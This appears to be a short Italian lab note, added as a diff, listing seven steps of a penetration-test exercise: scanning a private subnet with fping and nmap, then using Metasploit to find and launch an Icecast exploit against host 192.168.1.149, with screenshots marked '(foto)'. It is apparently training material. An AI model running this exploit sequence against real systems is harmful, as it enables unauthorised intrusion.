@@ -1,0 +1,7 @@
+1) net scan - fping -a -g 192.168.1.0/24
+2) nmap - nmap -sV -T5 192.168.1.149 (foto)
+3) avvio - msfsconsole
+4) exploit - search type:exploit icecast
+5) selezione - use 0
+6) config - set RHOSTS 192.168.1.149
+7) avvio - exploit (foto)
